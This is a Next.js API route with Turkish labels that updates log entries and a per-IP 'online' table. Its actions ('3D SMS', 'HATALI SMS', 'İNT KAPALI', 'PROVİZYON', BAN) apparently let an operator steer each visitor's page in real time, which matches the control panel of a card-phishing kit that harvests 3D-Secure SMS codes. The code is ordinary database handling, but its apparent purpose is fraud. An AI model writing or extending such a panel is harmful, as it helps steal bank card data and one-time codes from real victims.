import { NextRequest, NextResponse } from 'next/server';
import { query } from '@/lib/db';

interface Params {
  params: Promise<{ id: string }>;
}

// PUT update log status
export async function PUT(request: NextRequest, { params }: Params) {
  try {
    const { id } = await params;
    const body = await request.json();
    const { action } = body;

    // Map action to status and control value
    let newStatus = '';
    let controlValue = '';

    switch (action) {
      case '3D_SMS':
        newStatus = '3D SMS';
        controlValue = 'sms';
        break;
      case 'HATALI_SMS':
        newStatus = 'HATALI SMS';
        controlValue = 'hatalisms';
        break;
      case 'INT_KAPALI':
        newStatus = 'İNT KAPALI';
        controlValue = 'internet';
        break;
      case 'PROVIZYON':
        newStatus = 'PROVİZYON';
        controlValue = 'provizyon';
        break;
      case 'BAN':
        newStatus = 'BAN';
        // For BAN, we don't update kontrol, we update the 'ban' column
        controlValue = 'ban_action';
        break;
      case 'onay':
        newStatus = 'onaylandi';
        controlValue = 'onaylandi';
        break;
      case 'SIL':
        // Handle delete if passed as action, though usually handled by separate DELETE method
        break;
      default:
        return NextResponse.json({ error: 'Geçersiz işlem' }, { status: 400 });
    }

    // 1. Get the IP of the log entry
    const logResult: any = await query('SELECT ip FROM logs WHERE id = ?', [id]);

    if (logResult && logResult.length > 0) {
      const ip = logResult[0].ip;

      // 2. Update cevrimici_tablosu if we found an IP
      if (ip) {
        if (action === 'BAN') {
          // Special case for BAN: update 'ban' column to 1
          await query('UPDATE cevrimici_tablosu SET ban = 1 WHERE ip = ?', [ip]);
        } else if (controlValue) {
          // Normal case: update 'kontrol' column
          await query('UPDATE cevrimici_tablosu SET kontrol = ? WHERE ip = ?', [controlValue, ip]);
        }
      }
    }

    // 3. Update log status (existing logic)
    await query('UPDATE logs SET durum = ? WHERE id = ?', [newStatus, id]);

    return NextResponse.json({ success: true, status: newStatus });
  } catch (error) {
    console.error('Log action error:', error);
    return NextResponse.json({ error: 'İşlem başarısız' }, { status: 500 });
  }
}
